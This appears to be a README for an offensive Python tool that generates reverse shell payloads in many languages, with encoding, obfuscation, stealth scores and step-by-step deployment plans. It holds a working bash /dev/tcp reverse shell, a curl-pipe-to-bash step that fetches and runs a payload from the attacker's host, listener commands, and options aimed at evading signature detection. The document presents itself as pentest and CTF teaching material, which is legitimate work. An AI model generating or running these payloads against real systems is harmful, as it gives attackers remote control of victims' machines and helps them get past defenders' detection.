# Project 05 — Shell Payload Generator

**25+ reverse shell templates across 12 languages, with encoding, obfuscation, OPSEC analysis, and full deployment planning.**

**Authorized lab / CTF / penetration testing environments only.**

## What makes this different

A basic generator is just a list of copy-paste one-liners. This is an engineer-grade payload system built around a typed template database, an encoding engine, an OPSEC analyser, and a deployment planner that generates the complete attack workflow — not just the payload.

| Feature | Basic generator | This generator |
|---------|----------------|----------------|
| Templates | ~5 hard-coded strings | 25+ typed `PayloadTemplate` objects with metadata |
| Encoding | None | `plain` · `b64` · `url` · `ps_enc` (PowerShell -EncodedCommand) |
| Obfuscation | None | Variable renaming + string-split for bash/python |
| OPSEC analysis | None | Stealth score (1–10) + detection notes per payload |
| Deployment plan | None | Listener + HTTP host + delivery + PTY upgrade, step by step |
| Listener | None | Built-in raw TCP listener (`--listen PORT`) |
| Filtering | None | Filter by platform, language, minimum stealth score |
| Output formats | Print all | Table · single+OPSEC · cheat sheet |

## Usage

```bash
# Show all 25+ templates in a table
python3 shellgen.py --list

# Render one specific payload
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp

# Base64-encode a payload (breaks /dev/tcp string matching)
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name python3-socket --encode b64

# Apply obfuscation (variable name randomisation + IP splitting)
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp --obfuscate

# Render + print full 4-step deployment plan
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-fifo --plan

# Print all payloads as a compact cheat sheet
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --cheatsheet

# Filter to stealthy Linux payloads only
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --platform linux --min-stealth 6

# Start a built-in TCP listener (no nc required)
python3 shellgen.py --listen 4444

# PowerShell encoded command for Windows targets
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name ps-socket --encode ps_enc
```

## Sample output

```
  shellgen.py  |  lhost=192.168.100.10  lport=4444

  NAME                   LANG         PLATFORM   STEALTH                DESCRIPTION
  ─────────────────────  ───────────  ─────────  ─────────────────────  ─────────────────────────────────────
  bash-tcp               bash         linux      ██░░░░░░░░ 2/10        Classic bash /dev/tcp redirect
  bash-fifo              bash         linux      █████░░░░░ 5/10        Named pipe shell — avoids /dev/tcp
  python3-socket         python3      any        █████░░░░░ 5/10        Python3 socket + pty.spawn
  socat-ssl              socat        linux      ████████░░ 8/10        socat SSL-encrypted PTY shell
  ncat-ssl               netcat       linux      ███████░░░ 7/10        ncat with SSL encryption
  awk-shell              awk          linux      ███████░░░ 7/10        gawk /inet/tcp — no nc/python needed
  ...


  ╔══ BASH-TCP — Classic bash /dev/tcp redirect ═════════════════
  ║  Language  : bash
  ║  Stealth   : ██░░░░░░░░ 2/10
  ╠══ PAYLOAD

  bash -i >& /dev/tcp/192.168.100.10/4444 0>&1

  ╠══ OPSEC NOTES
  ║  ▸ Spawns 'bash -i' which is logged by most EDR products
  ║  ▸ '/dev/tcp' string matches hundreds of AV and SIEM signatures
  ║  ▸ Use ONLY in noisy lab environments or as a last resort
  ╚════════════════════════════════════════════════════════════════

  ╔══ DEPLOYMENT PLAN — bash-tcp ══════════════════════════════════
  STEP 1 — Start listener on attacker machine (Kali)
  nc -lvnp 4444

  STEP 2 — Host payload via HTTP
  python3 -m http.server 4445 --directory /tmp

  STEP 3 — Execute on target
  curl http://192.168.100.10:4445/shell.sh | bash

  STEP 4 — Stabilise shell
  python3 -c 'import pty; pty.spawn("/bin/bash")'  → CTRL+Z → stty raw -echo; fg
  ╚════════════════════════════════════════════════════════════════
```

## Key design decisions

- **`PayloadTemplate` is a frozen dataclass** — the entire template database is immutable at runtime, which prevents accidental mutation and makes templates safe to share across threads
- **Encoding is separate from templates** — the `EncodingEngine` is a pure static class; templates declare which encodings they support via their `encodable` list, so you can never accidentally apply `ps_enc` to a bash payload
- **OPSEC notes mirror real detection engineering** — each note describes exactly what a Sigma/Suricata/YARA rule would match, teaching both the attack technique and how defenders catch it
- **Obfuscation is intentionally shallow** — the goal is to illustrate the concept (break static string matching) not to implement actual AV evasion; deeper obfuscation is a module 3+ topic
- **`--listen` uses threading** — the receive loop runs in a daemon thread while the main thread handles stdin, so you can type commands and receive output simultaneously without blocking
